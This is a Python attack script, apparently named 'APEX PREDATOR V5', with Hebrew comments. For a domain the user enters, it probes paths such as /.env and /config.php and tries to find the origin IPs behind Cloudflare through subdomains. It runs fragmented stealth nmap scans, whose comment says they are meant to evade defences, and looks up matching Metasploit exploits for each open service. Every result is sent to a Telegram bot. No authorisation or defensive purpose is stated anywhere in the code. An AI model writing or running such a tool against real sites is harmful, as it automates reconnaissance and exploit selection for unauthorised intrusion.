import nmap
import requests
import shodan
import socket
import time
from urllib.parse import urlparse
from pymetasploit3.msfrpc import MsfRpcClient

# הגדרות מערכת
CONFIG = {
    'TG_TOKEN': 'code',
    'CHAT_ID': 'code',
    'SHODAN_KEY': 'code',
    'MSF_PASS': 'mypassword'
}

def send_tg(message):
    try:
        url = f"https://api.telegram.org/bot{CONFIG['TG_TOKEN']}/sendMessage"
        requests.post(url, data={'chat_id': CONFIG['CHAT_ID'], 'text': message}, timeout=10)
    except: pass

def get_real_ip(domain):
    print(f"[*] Searching for Cloudflare Bypass on {domain}...")
    subs = ['mail', 'direct', 'cpanel', 'ftp', 'dev', 'webmail', 'server', 'mysql']
    found_ips = set()
    try:
        main_ip = socket.gethostbyname(domain)
        found_ips.add(main_ip)
    except: main_ip = None

    for sub in subs:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            if ip != main_ip:
                send_tg(f"🕵️ Potential Bypass: {sub}.{domain} -> {ip}")
                found_ips.add(ip)
        except: continue
    return found_ips

def check_web_paths(domain):
    print(f"[*] Checking sensitive directories on {domain}...")
    paths = ['/admin', '/login', '/wp-admin', '/.env', '/config.php', '/backup']
    for path in paths:
        try:
            url = f"https://{domain}{path}"
            # verify=False עוזר לעקוף בעיות SSL אם יש כאלו בשרת
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200:
                msg = f"📂 Found Path: {url}"
                print(f"[!] {msg}")
                send_tg(msg)
        except: continue

def main():
    print("\n" + "="*45)
    print("  APEX PREDATOR V5 - FIXED CODE")
    print("="*45 + "\n")
    
    try:
        client = MsfRpcClient(CONFIG['MSF_PASS'], port=55553)
        print("[+] Connected to Metasploit RPC")
    except Exception as e:
        print(f"[-] Metasploit Connection: {e}")
        return

    raw_input = input("[?] Enter Target URL/Domain: ")
    parsed_url = urlparse(raw_input)
    domain = parsed_url.netloc if parsed_url.netloc else raw_input
    domain = domain.split(':')[0]

    send_tg(f"🚀 Deep Scan Started: {domain}")

    # שלב 1: סריקת נתיבי ווב
    check_web_paths(domain)

    # שלב 2: מציאת כתובות IP
    potential_ips = get_real_ip(domain)
    
    for ip in potential_ips:
        print(f"\n[*] Stealth Scanning IP: {ip}")
        try:
            nm = nmap.PortScanner()
            # סריקת Stealth איטית יותר לעקיפת הגנות
            nm.scan(ip, arguments="-sS -Pn -T2 -f")
            
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        service = nm[host][proto][port]['name']
                        state = nm[host][proto][port]['state']
                        
                        if state == 'open':
                            res = f"🔍 Port {port} Open: {service} ({ip})"
                            print(f"[!] {res}")
                            send_tg(res)

                            # שלב 3: חיפוש אקספלויט
                            search = client.modules.search(service)
                            if search:
                                send_tg(f"🔥 Exploit for {service}:\n`{search[0]['fullname']}`")
        except Exception as e:
            print(f"[-] Error: {e}")

    print("\n[+] Done.")
    send_tg("✅ Scan Finished.")

if __name__ == "__main__":
    main()
